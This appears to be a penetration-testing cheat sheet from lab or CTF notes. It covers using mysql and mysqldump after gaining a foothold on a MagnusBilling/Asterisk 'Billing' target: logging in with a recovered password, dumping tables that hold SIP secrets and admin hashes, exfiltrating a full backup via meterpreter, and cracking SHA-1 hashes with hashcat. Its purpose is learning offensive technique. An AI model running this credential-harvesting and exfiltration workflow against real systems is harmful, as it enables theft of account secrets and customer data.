# mysql / mysqldump

MariaDB / MySQL command-line client. Used for authenticated DB enumeration once credentials are recovered from config files (`/etc/asterisk/res_config_mysql.conf`, `.env`, Laravel / Magento configs). `mysqldump` gives a one-shot offline copy of the schema so grep works without keeping an interactive session open.

## Commands Used

### Remote login (blocked on Billing — default bind-address)
```bash
mysql -h $TARGET -u mbillingUser --password=BLOGYwvtJkI7uaX5
```
Used on: **Billing** — confirmed 3306 was filtered / bound to localhost; dropped to local client inside the foothold.

### Local client inside the foothold
```bash
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5'
```

### One-shot queries (`-e`)
```bash
# Dump a full table
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -D mbilling -e "SELECT * FROM pkg_user;" > /tmp/usuarios.txt    # Used — Billing

# Targeted fields (SIP secrets)
mysql -u mbillingUser -p'BLOGYwvtJkI7uaX5' -e \
  "SELECT id, name, secret, host, context FROM mbilling.pkg_sip LIMIT 20;"    # Used — Billing
```

### Full database backup
```bash
mysqldump -u mbillingUser -p'BLOGYwvtJkI7uaX5' mbilling > /tmp/mbilling_backup.sql    # Used — Billing
```
Handy when you want to grep the schema offline (transfer with meterpreter `download`, then `grep -Ei 'pass|secret|token' mbilling_backup.sql`).

### Useful introspection queries
```bash
# List databases
mysql -u <USER> -p'<PASS>' -e "SHOW DATABASES;"

# List tables
mysql -u <USER> -p'<PASS>' -D <DB> -e "SHOW TABLES;"

# Columns of a table
mysql -u <USER> -p'<PASS>' -D <DB> -e "DESCRIBE <table>;"

# Find every column whose name suggests credentials
mysql -u <USER> -p'<PASS>' -e \
  "SELECT table_schema, table_name, column_name
   FROM information_schema.columns
   WHERE column_name REGEXP 'pass|secret|token|key|hash';"
```

## MagnusBilling / Asterisk tables worth dumping

Billing's Asterisk stack stores everything in the `mbilling` database. These are the tables with high loot value:

| Table | Content |
|-------|---------|
| `pkg_user` | Admin / operator accounts, SHA-1 password hashes |
| `pkg_servers` | Remote Asterisk servers + credentials |
| `pkg_sip` | SIP extensions — `secret` column is the SIP auth password |
| `pkg_iax` | IAX trunks — same format, different protocol |
| `pkg_smtp` | Outbound mail server credentials (often reused elsewhere) |
| `pkg_api` | REST API keys |

The `pkg_user.password` field on MagnusBilling is raw SHA-1 → `hashcat -m 100`.

## Flag Cheatsheet

| Flag | Meaning |
|------|---------|
| `-h <host>` | Connect to host (default `localhost`) |
| `-P <port>` | Port (default 3306) |
| `-u <user>` | Username |
| `-p'<pass>'` | Password inline (no space — `-p <pass>` means "use DB named <pass>") |
| `--password=<pass>` | Same, explicit form |
| `-D <db>` | Default database |
| `-e "<sql>"` | Execute and exit (one-shot) |
| `-N` / `--skip-column-names` | Strip headers — useful when piping |
| `-s` / `--silent` | Less-verbose output |

## Related
- [hashcat](../creds/hashcat.md) — mode 100 for SHA-1 `pkg_user` hashes
- [Linux enumeration](../../exploits/enumeration/linux-enumeration.md) — where to grep for connection strings
